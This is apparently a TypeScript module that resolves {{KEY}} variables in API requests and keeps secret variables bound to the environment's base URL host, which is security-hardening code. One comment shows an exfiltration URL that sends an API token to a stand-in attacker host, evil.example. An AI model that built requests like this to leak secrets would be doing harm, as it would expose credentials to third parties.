import { InvalidEndpointError } from './ssrf-guard';

/**
 * {{KEY}} substitution for API requests (ISSUE-LOG API-23).
 *  - {{baseUrl}} comes from the environment's baseUrl field.
 *  - Every other {{KEY}} comes from the environment's variables (secrets included; raw values
 *    are read server-side only).
 *  - Resolved: endpoint, header values, query param values, auth fields, strings inside the body.
 *  - An unresolved reference is an error (400) instead of being sent literally.
 * Resolution happens BEFORE the SSRF check, so the final URL is what gets checked.
 */
const VARIABLE = /\{\{\s*([A-Za-z0-9_]+)\s*\}\}/g;

export interface ResolvableEnvironment {
  name: string;
  baseUrl: string | null;
  variables: { key: string; value: string; isSecret: boolean }[];
}

export interface ResolvedRequest extends RequestParts {
  /** True if any secret variable was substituted (caller must not follow redirects). */
  usesSecrets: boolean;
}

export interface RequestParts {
  endpoint: string;
  headers: Record<string, string>;
  queryParams: Record<string, string>;
  auth: Record<string, unknown> | null;
  body: unknown;
}

/** Every string inside a JSON value (object values, array items, the value itself). */
function forEachString(value: unknown, fn: (s: string) => void): void {
  if (typeof value === 'string') fn(value);
  else if (Array.isArray(value)) value.forEach((v) => forEachString(v, fn));
  else if (value !== null && typeof value === 'object') Object.values(value).forEach((v) => forEachString(v, fn));
}

function mapStrings(value: unknown, fn: (s: string) => string): unknown {
  if (typeof value === 'string') return fn(value);
  if (Array.isArray(value)) return value.map((v) => mapStrings(v, fn));
  if (value !== null && typeof value === 'object') {
    return Object.fromEntries(Object.entries(value).map(([k, v]) => [k, mapStrings(v, fn)]));
  }
  return value;
}

function referencedNames(parts: RequestParts): Set<string> {
  const names = new Set<string>();
  const collect = (s: string) => {
    for (const m of s.matchAll(VARIABLE)) names.add(m[1]);
  };
  forEachString([parts.endpoint, parts.headers, parts.queryParams, parts.auth, parts.body], collect);
  return names;
}

/** host[:port] of a URL, or null if it does not parse. */
function hostOf(url: string): string | null {
  try {
    return new URL(url).host.toLowerCase();
  } catch {
    return null;
  }
}

export function resolveRequest(parts: RequestParts, environment: ResolvableEnvironment | null): ResolvedRequest {
  const names = referencedNames(parts);
  if (names.size === 0) return { ...parts, usesSecrets: false };

  // Map, not a plain object: keys like "__proto__" or "constructor" must not hit the prototype.
  const values = new Map<string, string>();
  if (environment) {
    for (const v of environment.variables) values.set(v.key, v.value);
    if (environment.baseUrl) values.set('baseUrl', environment.baseUrl.replace(/\/+$/, '')); // no "//"
  }

  if (names.has('baseUrl') && !values.has('baseUrl')) {
    throw new InvalidEndpointError(
      environment ? `Environment ${environment.name} has no base URL` : 'Select an environment to resolve {{baseUrl}}',
    );
  }
  const missing = [...names].filter((n) => !values.has(n));
  if (missing.length > 0) {
    const list = missing.map((n) => `{{${n}}}`).join(', ');
    throw new InvalidEndpointError(
      environment
        ? `Unresolved variables: ${list} (not defined in environment ${environment.name})`
        : `Unresolved variables: ${list} (select an environment that defines them)`,
    );
  }

  const substitute = (s: string) => s.replace(VARIABLE, (_m, name: string) => values.get(name)!);
  const endpoint = substitute(parts.endpoint);

  // Secret binding (decision 2026-11-10): secrets are only ever sent to the environment's
  // baseUrl host. Otherwise anyone who can create + run a request could send a secret to
  // their own server (e.g. https://evil.example/?t={{API_TOKEN}}) and read it there.
  const secretKeys = new Set(environment?.variables.filter((v) => v.isSecret).map((v) => v.key));
  const usedSecrets = [...names].filter((n) => secretKeys.has(n));
  if (usedSecrets.length > 0) {
    const list = usedSecrets.map((n) => `{{${n}}}`).join(', ');
    const allowedHost = environment?.baseUrl ? hostOf(environment.baseUrl) : null;
    if (!allowedHost) {
      throw new InvalidEndpointError(`Secret variables (${list}) require the environment to have a base URL`);
    }
    if (hostOf(endpoint) !== allowedHost) {
      throw new InvalidEndpointError(
        `Secret variables (${list}) can only be sent to the environment's base URL host (${allowedHost})`,
      );
    }
  }

  return {
    endpoint,
    headers: mapStrings(parts.headers, substitute) as Record<string, string>,
    queryParams: mapStrings(parts.queryParams, substitute) as Record<string, string>,
    auth: mapStrings(parts.auth, substitute) as Record<string, unknown> | null,
    body: mapStrings(parts.body, substitute),
    usesSecrets: usedSecrets.length > 0,
  };
}
